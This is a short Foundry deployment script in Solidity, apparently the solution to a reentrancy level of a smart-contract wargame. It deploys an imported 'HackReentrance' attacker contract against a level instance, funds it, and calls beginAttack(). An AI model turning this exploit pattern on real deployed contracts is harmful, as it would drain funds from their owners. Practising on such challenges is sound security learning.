// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.8.0;

import "forge-std/Script.sol";

import { HackReentrance } from "../../contracts/solutions/HackReentrance.sol";

contract ReentranceScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("ACCOUNT_PRIVATE_KEY");
        address levelInstanceAddress = vm.envAddress("CONTRACT_INSTANCE_ADDRESS");
        vm.startBroadcast(deployerPrivateKey);

        HackReentrance hackReentrance = new HackReentrance(payable(levelInstanceAddress));

        (bool success,) = address(hackReentrance).call{value: 200000000000000}(
            abi.encodeWithSignature("contribute()")
        );

        hackReentrance.beginAttack();

        vm.stopBroadcast();

    }
}